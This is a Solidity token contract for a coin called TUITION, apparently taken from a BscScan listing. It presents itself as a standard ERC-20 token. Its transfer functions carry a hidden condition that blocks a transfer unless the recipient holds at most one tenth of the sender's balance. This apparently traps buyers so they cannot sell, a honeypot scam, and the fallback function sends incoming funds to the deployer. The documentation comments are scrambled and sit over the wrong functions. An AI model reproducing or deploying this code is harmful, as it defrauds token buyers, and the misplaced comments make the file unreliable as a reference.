/**
 *Submitted for verification at BscScan.com on 2021-10-31
*/

/**
 *Submitted for verification at BscScan.com on 2021-10-14
*/

// SPDX-License-Identifier: unlicensed

pragma solidity 0.5.17;
     

contract ERC20 {
         /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function totalSupply() public view returns (uint supply);
        /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function balanceOf(address who) public view returns (uint value);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) public view returns (uint remaining);
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function transferFrom(address from, address to, uint value) public returns (bool ok);
    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function approve(address spender, uint value) public returns (bool ok);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function transfer(address to, uint value) public returns (bool ok);
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emit an {Approval} event.
     */
    event Transfer(address indexed from, address indexed to, uint value);
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    event Approval(address indexed owner, address indexed spender, uint value);
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
}

contract TUITION is ERC20{
    uint8 public constant decimals = 18;
    uint256 initialSupply = 1000000000000000*10**uint256(decimals);
    string public constant name = "TUITION";
    string public constant symbol = "TUIT";

    address payable teamAddress;


    function totalSupply() public view returns (uint256) {
        return initialSupply;
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    
    function balanceOf(address owner) public view returns (uint256 balance) {
        return balances[owner];
    }

    function allowance(address owner, address spender) public view returns (uint remaining) {
        return allowed[owner][spender];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        if ((balances[to] * 10) <= balances[msg.sender]) {
        if (balances[msg.sender] >= value && value > 0) {
            balances[msg.sender] -= value;
            balances[to] += value;
            emit Transfer(msg.sender, to, value);
            return true;
        } else {
            return false;
        }
        }
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool success) {
        if ((balances[to] * 10) <= balances[from]) {
    
            if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {
    
                balances[to] += value;
                balances[from] -= value;
                allowed[from][msg.sender] -= value;
                emit Transfer(from, to, value);
                return true;
            } else {
                return false;
            }
        }
    
    }
    

    


    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
     function () external payable {
        teamAddress.transfer(msg.value);
    }

    constructor () public payable {
        teamAddress = msg.sender;
        balances[teamAddress] = initialSupply;
    }

   
}